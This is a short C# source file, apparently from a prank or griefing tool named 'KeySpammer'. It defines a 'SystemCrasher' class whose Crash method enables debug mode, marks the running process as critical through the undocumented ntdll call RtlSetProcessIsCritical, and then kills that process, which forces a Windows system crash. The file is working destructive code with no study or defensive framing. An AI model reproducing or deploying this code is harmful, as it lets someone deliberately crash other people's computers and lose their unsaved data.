using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net.NetworkInformation;
using System.Runtime.InteropServices;

namespace KeySpammer
{
    public class SystemCrasher
    {
        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern void RtlSetProcessIsCritical(bool bNew, IntPtr expectsZero, bool bNeedsScb);

        public static void Crash()
        {
            System.Diagnostics.Process.EnterDebugMode();
            try
            {
                RtlSetProcessIsCritical(true, IntPtr.Zero, false);
            }
            catch { }
            System.Diagnostics.Process.GetCurrentProcess().Kill();
        }
    }
}
